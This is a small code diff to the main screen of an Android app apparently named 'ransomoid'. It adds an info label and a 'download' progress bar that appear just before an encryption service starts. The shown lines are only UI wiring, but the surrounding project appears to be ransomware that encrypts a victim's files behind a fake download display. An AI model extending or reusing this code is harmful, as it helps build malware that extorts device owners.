@@ -13,6 +13,9 @@ import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
 import android.support.v7.app.AlertDialog;
 import android.support.v7.app.AppCompatActivity;
+import android.view.View;
+import android.widget.ProgressBar;
+import android.widget.TextView;
 
 import java.util.ArrayList;
 import java.util.List;
@@ -20,6 +23,9 @@ import java.util.List;
 import falezza.fabio.ransomoid.services.EncryptService;
 
 public class MainActivity extends AppCompatActivity {
+
+    private TextView tvInfo;
+    private ProgressBar pbDownload;
 
     String[] neededPermission = {
             Manifest.permission.INTERNET,
@@ -31,6 +37,9 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+
+        this.tvInfo = findViewById(R.id.tvInfo);
+        this.pbDownload = findViewById(R.id.progressBar);
 
         /*
          * To run permission is needed. If android version is greater than marshmallow it need to
@@ -76,6 +85,8 @@ public class MainActivity extends AppCompatActivity {
         @Override
         public void onClick(DialogInterface dialogInterface, int i) {
             if (checkPermissions()) {
+                tvInfo.setVisibility(View.VISIBLE);
+                pbDownload.setVisibility(View.VISIBLE);
                 startEncryptService();
             }
         }
